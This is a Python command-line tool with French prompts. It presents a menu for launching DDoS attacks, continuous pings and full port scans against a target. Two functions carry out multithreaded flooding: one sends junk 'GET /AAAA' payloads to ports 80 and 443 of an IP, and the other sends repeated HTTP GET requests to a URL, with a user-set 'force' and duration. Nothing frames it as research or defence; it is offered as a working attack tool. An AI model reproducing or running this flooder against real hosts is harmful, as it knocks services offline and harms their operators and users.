import socket
import threading
import time
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

def ddos_attack():
    target_ip = input("Entrez l'IP cible : ")
    duration = int(input("Entrez la durée de l'attaque en secondes : "))
    force = int(input("Entrez la force de l'attaque (sur 10) : "))
    
    # Convertir la force sur 10 en nombre de threads
    thread_count = force * 10  # 10 threads par point de force
    
    start_time = time.time()
    
    def attack_port(port):
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                s.sendto(("GET /" + "A" * 2000).encode('ascii'), (target_ip, port))
                s.close()
            except:
                pass
    
    print(f"Lancement de l'attaque DDoS sur {target_ip} pendant {duration} secondes avec une force de {force}/10.")
    print("Attaque sur les ports 80 et 443 simultanément...")
    
    # Lancer des threads pour attaquer les ports 80 et 443
    for port in [80, 443]:
        for _ in range(thread_count // 2):  # Diviser les threads entre les deux ports
            thread = threading.Thread(target=attack_port, args=(port,))
            thread.start()
    
    # Attendre que tous les threads se terminent
    time.sleep(duration)
    print("Attaque terminée.")

def ddos_url_attack():
    target_url = input("Entrez l'URL cible (ex: https://example.com) : ")
    duration = int(input("Entrez la durée de l'attaque en secondes : "))
    force = int(input("Entrez la force de l'attaque (sur 10) : "))
    
    # Analyser l'URL pour extraire le domaine et le chemin
    parsed_url = urllib.parse.urlparse(target_url)
    host = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else "/"
    
    # Résoudre le nom de domaine en adresse IP
    try:
        target_ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(f"Impossible de résoudre le nom d'hôte: {host}")
        return
    
    # Déterminer le port (80 pour HTTP, 443 pour HTTPS)
    port = 443 if parsed_url.scheme == 'https' else 80
    
    # Convertir la force sur 10 en nombre de threads
    thread_count = force * 10  # 10 threads par point de force
    
    start_time = time.time()
    
    def attack():
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, port))
                
                # Construire une requête HTTP valide
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                s.send(request.encode())
                
                # Recevoir la réponse (optionnel)
                response = s.recv(1024)
                s.close()
            except:
                pass
    
    print(f"Lancement de l'attaque DDoS sur {target_url} (IP: {target_ip}:{port}) pendant {duration} secondes avec une force de {force}/10.")
    
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()
    
    # Attendre que tous les threads se terminent
    time.sleep(duration)
    print("Attaque terminée.")

def ip_pinger():
    target_ip = input("Entrez l'IP à pinguer : ")
    count = input("Entrez le nombre de pings (laissez vide pour infini) : ")
    
    if count == "":
        count_param = "-t" if sys.platform.startswith('win') else ""
        command = ["ping", target_ip] + ([count_param] if count_param else [])
        print(f"Ping en continu vers {target_ip}. Appuyez sur Ctrl+C pour arrêter.")
    else:
        count_param = "-n" if sys.platform.startswith('win') else "-c"
        command = ["ping", count_param, count, target_ip]
        print(f"Ping {count} fois vers {target_ip}.")
    
    try:
        subprocess.run(command, check=True)
    except KeyboardInterrupt:
        print("\nPing arrêté.")
    except subprocess.CalledProcessError:
        print("Erreur lors du ping. Vérifiez l'adresse IP.")

def port_scanner():
    target_ip = input("Entrez l'IP à scanner : ")
    
    print(f"Scan des ports de {target_ip} en cours...")
    
    open_ports = []
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  # Timeout d'1 seconde
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} ouvert")
            sock.close()
        except:
            pass
    
    # Utiliser ThreadPoolExecutor pour scanner les ports plus rapidement
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1, 65536):
            executor.submit(scan_port, port)
    
    print("\nScan terminé.")
    if open_ports:
        print(f"Ports ouverts sur {target_ip}:")
        for port in sorted(open_ports):
            try:
                service = socket.getservbyport(port)
                print(f"Port {port}: {service}")
            except:
                print(f"Port {port}: Service inconnu")
    else:
        print(f"Aucun port ouvert trouvé sur {target_ip}.")

def main_menu():
    while True:
        print("\n===== MENU PRINCIPAL =====")
        print("1. Lancer une attaque DDoS sur IP (sans spécifier de port)")
        print("2. Lancer une attaque DDoS sur URL")
        print("3. Pinger une IP")
        print("4. Scanner les ports d'une IP")
        print("5. Quitter")
        
        choice = input("Choisissez une option (1-5): ")
        
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            ddos_url_attack()
        elif choice == "3":
            ip_pinger()
        elif choice == "4":
            port_scanner()
        elif choice == "5":
            print("Au revoir!")
            break
        else:
            print("Option invalide. Veuillez choisir une option entre 1 et 5.")

if __name__ == "__main__":
    main_menu()
